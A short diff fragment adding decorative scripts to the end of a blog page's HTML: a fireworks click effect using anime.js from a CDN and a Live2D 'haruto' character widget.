+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
